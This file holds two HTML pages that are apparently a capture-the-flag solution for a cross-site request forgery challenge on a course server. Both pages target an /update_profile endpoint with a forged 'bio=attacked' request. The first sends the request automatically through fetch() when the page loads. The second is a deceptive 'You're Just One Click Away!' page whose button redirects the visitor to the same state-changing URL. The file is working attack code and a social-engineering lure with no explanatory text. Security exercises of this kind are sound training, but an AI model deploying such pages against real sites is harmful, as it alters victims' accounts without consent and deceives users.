<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Fetch on Page Load</title>
    <script>
        // URL to send the GET request to
        const url = 'http://ssof2425.challenges.pedroadao.me:23255/update_profile?age=132&bio=attacked'; // Replace with your target URL
        
        // Send the request automatically when the script runs
        fetch(url)
            .then(() => console.log('Request sent successfully!'))
            .catch(error => console.error('Error:', error));
    </script>
</head>
<body>
    <h1>Auto Fetch Example</h1>
    <p>The GET request is sent automatically when this page is loaded.</p>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Button</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(45deg, #ff7e5f, #feb47b);
        }

        .container {
            text-align: center;
            color: white;
        }

        h1 {
            font-size: 36px;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        p {
            font-size: 18px;
            margin-bottom: 40px;
        }

        .button {
            padding: 15px 40px;
            font-size: 20px;
            color: white;
            background: linear-gradient(45deg, #ff6a00, #ee0979);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .button:hover {
            background: linear-gradient(45deg, #ff0979, #ff6a00);
            transform: translateY(-4px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .button:focus {
            outline: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>You're Just One Click Away!</h1>
        <p>Click the button below to proceed to the next step.</p>
        <button class="button" onclick="window.location.href='http://ssof2425.challenges.pedroadao.me:23255/update_profile?age=132&bio=attacked';">
            Click Here to Continue
        </button>
    </div>

</body>
</html>
